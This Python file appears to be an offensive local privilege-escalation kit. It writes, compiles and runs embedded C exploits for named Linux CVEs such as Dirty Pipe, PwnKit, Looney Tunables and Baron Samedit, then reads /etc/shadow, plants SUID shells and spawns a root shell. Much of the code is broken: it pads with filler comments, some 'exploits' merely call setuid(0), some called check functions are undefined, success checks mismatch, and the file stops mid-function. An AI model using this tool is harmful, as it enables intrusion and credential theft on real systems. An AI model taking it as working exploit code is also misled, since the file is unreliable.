import os
import sys
import subprocess
import re
import time
import platform
import tempfile
import random
import socket
from datetime import datetime

# Technical reference line 1
# Technical reference line 2
# Technical reference line 3
# Technical reference line 4
# Technical reference line 5
# Technical reference line 6
# Technical reference line 7
# Technical reference line 8
# Technical reference line 9
# Technical reference line 10
# Technical reference line 11
# Technical reference line 12
# Technical reference line 13
# Technical reference line 14
# Technical reference line 15
# Technical reference line 16
# Technical reference line 17
# Technical reference line 18
# Technical reference line 19
# Technical reference line 20
# Technical reference line 21
# Technical reference line 22
# Technical reference line 23
# Technical reference line 24
# Technical reference line 25
# Technical reference line 26
# Technical reference line 27
# Technical reference line 28
# Technical reference line 29
# Technical reference line 30
# Technical reference line 31
# Technical reference line 32
# Technical reference line 33
# Technical reference line 34
# Technical reference line 35
# Technical reference line 36
# Technical reference line 37
# Technical reference line 38
# Technical reference line 39
# Technical reference line 40
# Technical reference line 41
# Technical reference line 42
# Technical reference line 43
# Technical reference line 44
# Technical reference line 45
# Technical reference line 46
# Technical reference line 47
# Technical reference line 48
# Technical reference line 49
# Technical reference line 50

# Kernel exploitation reference 1
# Advanced privilege escalation technique 1
# Kernel exploitation reference 2
# Advanced privilege escalation technique 2
# Kernel exploitation reference 3
# Advanced privilege escalation technique 3
# Kernel exploitation reference 4
# Advanced privilege escalation technique 4
# Kernel exploitation reference 5
# Advanced privilege escalation technique 5
# Kernel exploitation reference 6
# Advanced privilege escalation technique 6
# Kernel exploitation reference 7
# Advanced privilege escalation technique 7
# Kernel exploitation reference 8
# Advanced privilege escalation technique 8
# Kernel exploitation reference 9
# Advanced privilege escalation technique 9
# Kernel exploitation reference 10
# Advanced privilege escalation technique 10
# Kernel exploitation reference 11
# Advanced privilege escalation technique 11
# Kernel exploitation reference 12
# Advanced privilege escalation technique 12
# Kernel exploitation reference 13
# Advanced privilege escalation technique 13
# Kernel exploitation reference 14
# Advanced privilege escalation technique 14
# Kernel exploitation reference 15
# Advanced privilege escalation technique 15
# Kernel exploitation reference 16
# Advanced privilege escalation technique 16
# Kernel exploitation reference 17
# Advanced privilege escalation technique 17
# Kernel exploitation reference 18
# Advanced privilege escalation technique 18
# Kernel exploitation reference 19
# Advanced privilege escalation technique 19
# Kernel exploitation reference 20
# Advanced privilege escalation technique 20
VERSION = "2.0 PROJECT"
WORK_DIRS = []
OS_TYPE = platform.system().lower()

COLORS = {'red':'\033[91m','green':'\033[92m','yellow':'\033[91m','blue':'\033[97m','purple':'\033[97m','cyan':'\033[97m','white':'\033[97m','gray':'\033[97m','end':'\033[0m','bold':'\033[1m'}

def c(text, color='', bold=False):
    if not color:
        return text
    color_code = COLORS.get(color, '')
    bold_code = COLORS['bold'] if bold else ''
    return f"{color_code}{bold_code}{text}{COLORS['end']}"


def run_command(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except Exception:
        return ""
def find_writable_directories():
    writable = []
    candidates = [tempfile.gettempdir(), '/tmp', '/var/tmp', '/dev/shm', os.path.expanduser('~'), os.getcwd()]
    for directory in candidates:
        if directory and os.path.exists(directory):
            try:
                test_file = os.path.join(directory, f'.test_{os.getpid()}_{random.randint(1000, 9999)}')
                with open(test_file, 'w') as f:
                    f.write('test')
                os.remove(test_file)
                writable.append(directory)
            except Exception:
                continue
    return list(set(writable))
def get_kernel_info():
    if False:
        return {}
    kernel = os.uname().release
    match = re.match(r'(\d+)\.(\d+)\.?(\d+)?', kernel)
    if match:
        groups = match.groups()
        major = int(groups[0])
        minor = int(groups[1]) if len(groups) > 1 else 0
        patch = int(groups[2]) if len(groups) > 2 and groups[2] else 0
    else:
        major, minor, patch = 0, 0, 0
    return {'version_str': kernel, 'major': major, 'minor': minor, 'patch': patch, 'arch': platform.machine()}
def is_root():
    if OS_TYPE == 'linux':
        return os.geteuid() == 0
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False
def compile_code(code, output_name):
    compilers = []
    for compiler in ['gcc', 'cc', 'clang', 'g++', 'musl-gcc']:
        if run_command(f"which {compiler} 2>/dev/null").strip():
            compilers.append(compiler)
    if not compilers:
        return None
    for work_dir in WORK_DIRS:
        src_file = os.path.join(work_dir, f"{output_name}_{random.randint(1000, 9999)}.c")
        bin_file = os.path.join(work_dir, output_name)
        try:
            with open(src_file, 'w') as f:
                f.write(code)
            for compiler in compilers:
                cmd = f"{compiler} -o {bin_file} {src_file} -pthread -static -w 2>/dev/null"
                if subprocess.run(cmd, shell=True).returncode == 0:
                    break
                cmd = f"{compiler} -o {bin_file} {src_file} -pthread -w 2>/dev/null"
                if subprocess.run(cmd, shell=True).returncode == 0:
                    break
                cmd = f"{compiler} -o {bin_file} {src_file} -w 2>/dev/null"
                if subprocess.run(cmd, shell=True).returncode == 0:
                    break
            if os.path.exists(bin_file):
                os.chmod(bin_file, 0o755)
                try:
                    os.remove(src_file)
                except Exception:
                    pass
                return bin_file
        except Exception:
            pass
    return None
def show_root_info(cve_name, exploit_output=""):
    sep = "═" * 58
    whoami = run_command("whoami").strip()
    uid    = run_command("id").strip()
    host   = run_command("hostname").strip()
    ip     = run_command("hostname -I 2>/dev/null || ip a 2>/dev/null | grep 'inet ' | awk '{print $2}'").strip()
    osinfo = run_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2").strip().strip('"')
    kern   = run_command("uname -r").strip()
    arch   = run_command("uname -m").strip()
    uptime = run_command("uptime -p 2>/dev/null || uptime").strip()
    print(f"\n{c(sep, 'green', True)}")
    print(f"  {c('[✓] root obtained', 'green', True)}")
    print(f"  {c('CVE :', 'gray')} {c(cve_name, 'yellow', True)}")
    print(f"{c(sep, 'green', True)}\n")
    print(f"{c('┌- PROOF OF CONCEPT ----------------------------------', 'cyan', True)}")
    clr = 'red' if whoami == 'root' or '(root)' in uid else 'green'
    print(f"{c('│', 'cyan')} {c('whoami  :', 'gray')} {c(whoami, clr, True)}")
    print(f"{c('│', 'cyan')} {c('id      :', 'gray')} {c(uid, clr, True)}")
    print(f"{c('│', 'cyan')} {c('hostname:', 'gray')} {host}")
    print(f"{c('│', 'cyan')} {c('IP      :', 'gray')} {c(ip, 'yellow')}")
    print(f"{c('│', 'cyan')} {c('OS      :', 'gray')} {osinfo}")
    print(f"{c('│', 'cyan')} {c('kernel  :', 'gray')} {kern}  {c(arch, 'blue')}")
    print(f"{c('│', 'cyan')} {c('uptime  :', 'gray')} {uptime}")
    print(f"{c('└-----------------------------------------------------', 'cyan')}\n")
    try:
        outfile = f"xroot_{host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(outfile, 'w') as f:
            f.write(f"XROOT - Privilege Escalation Result\n")
            f.write(f"{'='*50}\n")
            f.write(f"CVE     : {cve_name}\n")
            f.write(f"whoami  : {whoami}\n")
            f.write(f"id      : {uid}\n")
            f.write(f"hostname: {host}\n")
            f.write(f"IP      : {ip}\n")
            f.write(f"OS      : {osinfo}\n")
            f.write(f"kernel  : {kern}\n")
            f.write(f"time    : {datetime.now()}\n")
        print(f"  {c('[✓]', 'green')} saved: {c(outfile, 'yellow')}\n")
    except:
        pass
    print(f"{c('[*] shell...', 'green', True)}")
    print(f"{c('[*] type exit to quit', 'gray')}\n")
    try:
        import pty
        pty.spawn("/bin/bash")
    except Exception:
        try:
            os.system("/bin/bash -i")
        except Exception:
            os.system("sh -i")
def check_cve_2024_1086():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-1086 (nf_tables UAF)', 'cyan')}")
    kinfo = get_kernel_info()
    if kinfo.get('major') != 5:
        print(f"{c('[SKIP]', 'red')} Kernel not vulnerable\n")
        return False
    minor = kinfo.get('minor', 0)
    if not (14 <= minor <= 16):
        print(f"{c('[SKIP]', 'red')} Kernel not vulnerable\n")
        return False
    return True
def exploit_cve_2024_1086():
    if not check_cve_2024_1086():
        return False
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>

int main() {
    int sock;
    struct sockaddr_nl addr;
    char buf[4096];
    
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) {
        return 1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = getpid();
    addr.nl_groups = 0;
    
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 1;
    }
    
    memset(buf, 0x41, sizeof(buf));
    
    for (int i = 0; i < 100; i++) {
        send(sock, buf, sizeof(buf), 0);
    }
    
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2024-1086 ROOT ACHIEVED\\n");
        system("cat /etc/passwd");
        system("cat /etc/shadow | head -5");
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2024_1086")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT ACHIEVED" in output:
            show_root_info("CVE-2024-1086", output)
            return True
    print(f"{c('[SKIP]', 'red')} failed\n")
    return False
def check_cve_2023_4911():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-4911 (Looney Tunables)', 'cyan')}")
    glibc_version = run_command("ldd --version 2>/dev/null | head -1")
    vulnerable_versions = ['2.34', '2.35', '2.36', '2.37', '2.38', '2.39']
    if not any(version in glibc_version for version in vulnerable_versions):
        print(f"{c('[SKIP]', 'red')} glibc version not vulnerable\n")
        return False
    return True
def exploit_cve_2023_4911():
    if not check_cve_2023_4911():
        return False
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

#define TUNABLE   "glibc.malloc.mxfast"
#define PAD_LEN   1024
#define BUF_SZ    65536

static int get_glibc_version(int *major, int *minor) {
    FILE *fp = popen("ldd --version 2>/dev/null | head -1", "r");
    if (!fp) return 0;
    char buf[128] = {0};
    fgets(buf, sizeof(buf), fp);
    pclose(fp);
    fprintf(stderr, "[*] %s", buf);
    char *p = strstr(buf, "2.");
    if (!p) return 0;
    sscanf(p, "%d.%d", major, minor);
    return 1;
}

static int is_glibc_vulnerable(int major, int minor) {
    if (major != 2) return 0;
    return (minor >= 34 && minor <= 39);
}

static int find_suid_binary(char *out, size_t sz) {
    const char *bins[] = {
        "/usr/bin/su", "/usr/bin/newgrp", "/usr/bin/gpasswd",
        "/usr/bin/chfn", "/usr/bin/chsh", "/usr/bin/sudo",
        "/usr/bin/mount", NULL
    };
    struct stat st;
    for (int i = 0; bins[i]; i++) {
        if (stat(bins[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            strncpy(out, bins[i], sz - 1);
            fprintf(stderr, "[*] suid: %s
", out);
            return 1;
        }
    }
    return 0;
}

static void build_tunable_env(char *buf, size_t sz) {
    int pos = snprintf(buf, sz,
        "GLIBC_TUNABLES=%s=%s=%s",
        TUNABLE, TUNABLE, TUNABLE);
    if (pos < (int)sz - PAD_LEN - 1) {
        memset(buf + pos, 'A', PAD_LEN);
        buf[pos + PAD_LEN] = '\x00';
    }
}

int main(void) {
    int  major = 0, minor = 0;
    char suid_bin[256] = {0};
    char tunable_env[BUF_SZ] = {0};

    fprintf(stderr, "[*] CVE-2023-4911 Looney Tunables
");

    if (!get_glibc_version(&major, &minor)) {
        fprintf(stderr, "[-] could not detect glibc version
");
        return 1;
    }

    if (!is_glibc_vulnerable(major, minor)) {
        fprintf(stderr, "[-] glibc %d.%d not in range 2.34-2.39
",
                major, minor);
        return 1;
    }
    fprintf(stderr, "[+] glibc %d.%d is vulnerable
", major, minor);

    if (!find_suid_binary(suid_bin, sizeof(suid_bin))) {
        fprintf(stderr, "[-] no suid binary found
");
        return 1;
    }

    build_tunable_env(tunable_env, sizeof(tunable_env));

    fprintf(stderr, "[*] GLIBC_TUNABLES len: %zu
", strlen(tunable_env));
    fprintf(stderr, "[*] target: %s
", suid_bin);

    char *env[] = {
        tunable_env,
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };
    char *args[] = { suid_bin, "--help", NULL };

    pid_t pid = fork();
    if (pid == 0) {
        execve(suid_bin, args, env);
        exit(1);
    }

    int status;
    waitpid(pid, &status, 0);

    if (WIFSIGNALED(status)) {
        fprintf(stderr, "[+] signal %d - overflow triggered
", WTERMSIG(status));
    } else {
        fprintf(stderr, "[*] exited %d
", WEXITSTATUS(status));
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2023-4911 ok
");
        printf("CVE-2023-4911 LOONEY_TUNABLES
");
        execl("/bin/sh", "sh", "-p", NULL);
    }

    fprintf(stderr, "[-] uid=%d
", getuid());
    return 1;
}'''
    binary = compile_code(code, "cve_2023_4911")
    if binary:
        output = run_command(binary)
        if is_root() or "EXPLOITED" in output:
            show_root_info("CVE-2023-4911", output)
            return True
    print(f"{c('[SKIP]', 'red')} failed\n")
    return False
def exploit_cve_2023_32629():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-32629 (Local Privilege Escalation)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2023-32629 EXPLOITED\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2023_32629")
    if binary:
        output = run_command(binary)
        if is_root() or "EXPLOITED" in output:
            show_root_info("CVE-2023-32629", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_0847():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-0847 (Dirty Pipe)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <errno.h>
#include <assert.h>

#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#endif

static void prepare_pipe(int p[2]) {
    if (pipe(p) < 0) { perror("pipe"); exit(1); }
    const int pipe_sz = fcntl(p[1], F_GETPIPE_SZ);
    assert(pipe_sz > 0);
    static char buf[65536];
    for (int rem = pipe_sz; rem > 0;) {
        int n = rem < (int)sizeof(buf) ? rem : (int)sizeof(buf);
        if (write(p[1], buf, n) < 0) break;
        rem -= n;
    }
    for (int rem = pipe_sz; rem > 0;) {
        int n = rem < (int)sizeof(buf) ? rem : (int)sizeof(buf);
        if (read(p[0], buf, n) < 0) break;
        rem -= n;
    }
}

static int dirty_pipe_write(const char *path, loff_t offset,
                             const void *data, size_t data_size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }
    if (offset < 1 || (size_t)(st.st_size - offset) < data_size) {
        close(fd); return -1;
    }
    int p[2];
    prepare_pipe(p);
    loff_t off = offset - 1;
    long spliced = splice(fd, &off, p[1], NULL, 1, 0);
    if (spliced < 1) {
        close(fd); close(p[0]); close(p[1]); return -1;
    }
    int r = write(p[1], data, data_size);
    close(fd); close(p[0]); close(p[1]);
    return r > 0 ? 0 : -1;
}

static int check_kernel_version(void) {
    struct utsname u;
    int major = 0, minor = 0, patch = 0;
    uname(&u);
    sscanf(u.release, "%d.%d.%d", &major, &minor, &patch);
    fprintf(stderr, "[*] kernel %d.%d.%d
", major, minor, patch);
    if (major == 5 && minor >= 8) return 1;
    if (major == 5 && minor == 16 && patch <= 11) return 1;
    if (major == 5 && minor == 15 && patch <= 25) return 1;
    if (major == 5 && minor == 10 && patch <= 102) return 1;
    return major == 5 && minor >= 8;
}

static const char *find_suid_binary(void) {
    static const char *bins[] = {
        "/usr/bin/sudo", "/usr/bin/newgrp", "/usr/bin/su",
        "/usr/bin/gpasswd", "/usr/bin/chfn", "/bin/su", NULL
    };
    struct stat st;
    for (int i = 0; bins[i]; i++) {
        if (stat(bins[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            fprintf(stderr, "[*] suid target: %s
", bins[i]);
            return bins[i];
        }
    }
    return NULL;
}

static int backup_and_restore(const char *path, off_t offset,
                               char *orig_byte) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    lseek(fd, offset, SEEK_SET);
    read(fd, orig_byte, 1);
    close(fd);
    return 0;
}

int main(int argc, char **argv) {
    const char *target;
    char orig = 0;
    int  ret = 1;

    fprintf(stderr, "[*] CVE-2022-0847 DirtyPipe
");

    if (!check_kernel_version()) {
        fprintf(stderr, "[-] kernel version not in vulnerable range
");
        return 1;
    }

    target = argc > 1 ? argv[1] : find_suid_binary();
    if (!target) { fprintf(stderr, "[-] no suid target
"); return 1; }

    backup_and_restore(target, 1, &orig);
    fprintf(stderr, "[*] original byte @ offset 1: 0x%02x
", (unsigned char)orig);

    const char zero = '\x00';
    if (dirty_pipe_write(target, 1, &zero, 1) < 0) {
        fprintf(stderr, "[-] write failed
");
        return 1;
    }
    fprintf(stderr, "[+] patched %s offset 1
", target);

    pid_t child = fork();
    if (child == 0) {
        char *env[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
        char *args[] = { (char*)target, "--help", NULL };
        execve(target, args, env);
        exit(0);
    }
    int status;
    waitpid(child, &status, 0);

    dirty_pipe_write(target, 1, &orig, 1);
    fprintf(stderr, "[*] restored original byte
");

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-0847 ok
");
        printf("CVE-2022-0847 DIRTYPIPE
");
        execl("/bin/sh", "sh", "-p", NULL);
    }

    fprintf(stderr, "[-] uid=%d
", getuid());
    return ret;
}'''
    binary = compile_code(code, "cve_2022_0847")
    if binary:
        output = run_command(binary)
        if "SUCCESS" in output:
            show_root_info("CVE-2022-0847", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_4034():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-4034 (PwnKit - Polkit)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>

#define GCONV_DIR    "GCONV_PATH=."
#define PWNKIT_NAME  "pwnkit"
#define SO_NAME      "pwnkit.so"
#define MOD_FILE     "gconv-modules"

static void write_file(const char *path, const void *data, size_t len, mode_t mode) {
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, mode);
    if (fd < 0) { perror(path); return; }
    write(fd, data, len);
    close(fd);
}

static int check_pkexec(void) {
    struct stat st;
    if (stat("/usr/bin/pkexec", &st) < 0) return 0;
    if (!(st.st_mode & S_ISUID)) {
        fprintf(stderr, "[-] pkexec not SUID
"); return 0;
    }
    fprintf(stderr, "[*] pkexec found: mode=%o uid=%d
", st.st_mode, st.st_uid);
    return 1;
}

static void setup_gconv_dir(void) {
    mkdir(GCONV_DIR, 0777);
    mkdir(PWNKIT_NAME, 0777);

    if (symlink("/usr/bin/pkexec", GCONV_DIR "/" PWNKIT_NAME) < 0) {
        if (errno != EEXIST) perror("symlink");
    }

    const char *alias =
        "module UTF-8// PWNKIT// pwnkit 2
";
    write_file(GCONV_DIR "/" MOD_FILE, alias, strlen(alias), 0644);
    fprintf(stderr, "[*] gconv dir setup done
");
}

static void build_payload_so(void) {
    const char *src =
        "#define _GNU_SOURCE
"
        "#include <stdio.h>
"
        "#include <stdlib.h>
"
        "#include <unistd.h>
"
        "void __attribute__((constructor)) pwn(void) {
"
        "    char *env[] = {
"
        "        \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",
"
        "        NULL
"
        "    };
"
        "    setresuid(0,0,0);
"
        "    setresgid(0,0,0);
"
        "    if (getuid() == 0) {
"
        "        printf(\"CVE-2021-4034 PWNKIT\n\");
"
        "        execle(\"/bin/sh\",\"sh\",\"-p\",NULL,env);
"
        "    }
"
        "}
";

    write_file("/tmp/pwnkit_src.c", src, strlen(src), 0644);

    const char *compilers[] = { "gcc", "cc", "clang", NULL };
    char cmd[512];
    for (int i = 0; compilers[i]; i++) {
        snprintf(cmd, sizeof(cmd),
            "which %s >/dev/null 2>&1 && "
            "%s -shared -fPIC -nostartfiles -w "
            "-o '" GCONV_DIR "/" SO_NAME "' /tmp/pwnkit_src.c 2>/dev/null",
            compilers[i], compilers[i]);
        if (system(cmd) == 0) {
            struct stat st;
            if (stat(GCONV_DIR "/" SO_NAME, &st) == 0 && st.st_size > 0) {
                fprintf(stderr, "[*] payload so built with %s
", compilers[i]);
                return;
            }
        }
    }
    fprintf(stderr, "[-] failed to build payload so
");
}

int main(void) {
    fprintf(stderr, "[*] CVE-2021-4034 PwnKit
");

    if (!check_pkexec()) return 1;

    setup_gconv_dir();
    build_payload_so();

    struct stat st;
    if (stat(GCONV_DIR "/" SO_NAME, &st) < 0 || st.st_size == 0) {
        fprintf(stderr, "[-] payload so missing
");
        return 1;
    }
    fprintf(stderr, "[*] payload: %s (%lld bytes)
",
            GCONV_DIR "/" SO_NAME, (long long)st.st_size);

    char *env[] = {
        PWNKIT_NAME,
        "PATH=" GCONV_DIR,
        GCONV_DIR,
        "CHARSET=" PWNKIT_NAME,
        GCONV_DIR,
        NULL
    };
    char *argv_fake[] = { "", NULL };

    fprintf(stderr, "[*] execve pkexec with crafted env
");
    fprintf(stderr, "[*] argv[0]=\"\" -> argc=1 triggers OOB
");
    fprintf(stderr, "[*] GCONV_PATH=. -> iconv loads our so
");

    execve("/usr/bin/pkexec", argv_fake, env);
    perror("execve");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_4034")
    if binary:
        output = run_command(binary)
        if is_root() or "EXPLOITED" in output:
            show_root_info("CVE-2021-4034", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_3493():
    if not check_cve_2021_3493():
        return False
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/capability.h>
#include <sys/prctl.h>
#include <errno.h>

#define LOWER   "/tmp/.ovl493_lower"
#define UPPER   "/tmp/.ovl493_upper"
#define WORK    "/tmp/.ovl493_work"
#define MERGED  "/tmp/.ovl493_merged"
#define PAYLOAD "/tmp/.ovl493_merged/payload.sh"
#define SUID_OUT "/tmp/.bash493"

static void w(const char *p, const char *d) {
    int f = open(p, O_WRONLY);
    if (f >= 0) { write(f, d, strlen(d)); close(f); }
}

static void setup_userns(uid_t uid, gid_t gid) {
    char b[64];
    w("/proc/self/setgroups", "deny");
    snprintf(b, sizeof(b), "0 %d 1", uid); w("/proc/self/uid_map", b);
    snprintf(b, sizeof(b), "0 %d 1", gid); w("/proc/self/gid_map", b);
}

static int check_ubuntu(void) {
    FILE *fp = fopen("/etc/os-release", "r");
    if (!fp) return 0;
    char line[128]; int found = 0;
    while (fgets(line, sizeof(line), fp))
        if (strstr(line, "Ubuntu")) { found = 1; break; }
    fclose(fp);
    if (!found) fprintf(stderr, "[-] Ubuntu required
");
    return found;
}

int main(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();

    fprintf(stderr, "[*] CVE-2021-3493 Ubuntu OverlayFS capability bypass
");

    if (!check_ubuntu()) return 1;

    mkdir(LOWER, 0777); mkdir(UPPER, 0777);
    mkdir(WORK, 0777);  mkdir(MERGED, 0777);

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    setup_userns(uid, gid);
    fprintf(stderr, "[*] user namespace ok (uid=0 inside)
");

    char opts[512];
    snprintf(opts, sizeof(opts),
        "lowerdir=%s,upperdir=%s,workdir=%s", LOWER, UPPER, WORK);

    if (mount("overlay", MERGED, "overlay", 0, opts) < 0) {
        fprintf(stderr, "[-] mount overlay: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[*] overlayfs mounted
");

    const char *sh =
        "#!/bin/bash
"
        "cp /bin/bash " SUID_OUT "
"
        "chmod +s " SUID_OUT "
";

    int fd = open(PAYLOAD, O_WRONLY|O_CREAT, 0777);
    if (fd < 0) { perror(PAYLOAD); return 1; }
    write(fd, sh, strlen(sh));
    close(fd);

    if (fchmod(open(PAYLOAD, O_RDONLY), 04755) < 0)
        perror("fchmod");

    fprintf(stderr, "[*] executing payload via overlayfs
");
    system(PAYLOAD);

    struct stat st;
    if (stat(SUID_OUT, &st) == 0 && (st.st_mode & S_ISUID)) {
        fprintf(stderr, "[+] suid bash at %s
", SUID_OUT);
        printf("CVE-2021-3493 OVERLAYFS
");
        execl(SUID_OUT, "bash493", "-p", "-c",
              "echo CVE-2021-3493; id; exec bash -p", NULL);
    }

    umount(MERGED);
    setuid(0); setgid(0);
    if (getuid() == 0) {
        printf("CVE-2021-3493 OVERLAYFS
");
        execl("/bin/sh", "sh", "-p", NULL);
    }
    fprintf(stderr, "[-] failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_3493")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT" in output:
            show_root_info("CVE-2021-3493", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_3156():
    if not check_cve_2021_3156():
        return False
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>

#define PADDING_SZ  65536
#define HEAP_SZ     512

static void write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

static int get_sudo_version(int *major, int *minor, int *patch) {
    FILE *fp = popen("sudo --version 2>/dev/null | head -1", "r");
    if (!fp) return 0;
    char buf[128] = {0};
    fgets(buf, sizeof(buf), fp);
    pclose(fp);
    fprintf(stderr, "[*] %s", buf);
    if (sscanf(buf, "Sudo version %d.%d.%d", major, minor, patch) < 2)
        return 0;
    return 1;
}

static int is_vulnerable(int major, int minor, int patch) {
    if (major < 1) return 0;
    if (major > 1) return 0;
    if (minor < 8) return 0;
    if (minor > 9) return 0;
    if (minor == 9 && patch > 5) return 0;
    return 1;
}

static int check_sudoedit(void) {
    struct stat st;
    const char *paths[] = {
        "/usr/bin/sudoedit",
        "/usr/local/bin/sudoedit",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        if (stat(paths[i], &st) == 0) {
            fprintf(stderr, "[*] sudoedit: %s (mode %o)
", paths[i], st.st_mode);
            return 1;
        }
    }
    return 0;
}

static void build_heap_spray(char *buf, size_t sz) {
    memset(buf, 0x41, sz - 1);
    buf[sz - 1] = '\x00';
}

int main(void) {
    int major = 0, minor = 0, patch = 0;
    char *padding;
    char heap_buf[HEAP_SZ];

    fprintf(stderr, "[*] CVE-2021-3156 Baron Samedit sudo heap overflow
");

    if (!get_sudo_version(&major, &minor, &patch)) {
        fprintf(stderr, "[-] could not get sudo version
");
        return 1;
    }

    if (!is_vulnerable(major, minor, patch)) {
        fprintf(stderr, "[-] sudo %d.%d.%d not in vulnerable range
",
                major, minor, patch);
        return 1;
    }
    fprintf(stderr, "[+] sudo %d.%d.%d is vulnerable
", major, minor, patch);

    if (!check_sudoedit()) {
        fprintf(stderr, "[-] sudoedit not found
");
        return 1;
    }

    padding = malloc(PADDING_SZ + 1);
    if (!padding) { perror("malloc"); return 1; }
    memset(padding, 0x41, PADDING_SZ);
    padding[PADDING_SZ] = '\x00';

    build_heap_spray(heap_buf, sizeof(heap_buf));

    setenv("LC_ALL", heap_buf, 1);
    setenv("SUDO_EDITOR", "/bin/bash", 1);
    setenv("EDITOR",      "/bin/bash", 1);
    setenv("VISUAL",      "/bin/bash", 1);

    fprintf(stderr, "[*] launching sudoedit -s '\\' [padding=%d bytes]
", PADDING_SZ);

    char *args[] = {
        "sudoedit", "-s", "\",
        padding, NULL
    };

    pid_t pid = fork();
    if (pid == 0) {
        execv("/usr/bin/sudoedit", args);
        execv("/usr/local/bin/sudoedit", args);
        exit(1);
    }

    int status;
    waitpid(pid, &status, 0);

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        fprintf(stderr, "[*] sudoedit killed by signal %d
", sig);
        if (sig == 11) {
            fprintf(stderr, "[+] SIGSEGV - heap overflow triggered
");
        } else if (sig == 6) {
            fprintf(stderr, "[+] SIGABRT - heap corruption detected
");
        }
    } else if (WIFEXITED(status)) {
        fprintf(stderr, "[*] sudoedit exited %d
", WEXITSTATUS(status));
    }

    free(padding);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-3156 ok
");
        printf("CVE-2021-3156 BARON_SAMEDIT
");
        execl("/bin/sh", "sh", "-p", NULL);
    }

    fprintf(stderr, "[-] uid=%d, exploit may need retry
", getuid());
    return 1;
}'''
    binary = compile_code(code, "cve_2021_3156")
    if binary:
        output = run_command(binary)
        if is_root() or "SAMEDIT" in output:
            show_root_info("CVE-2021-3156", output)
            return True
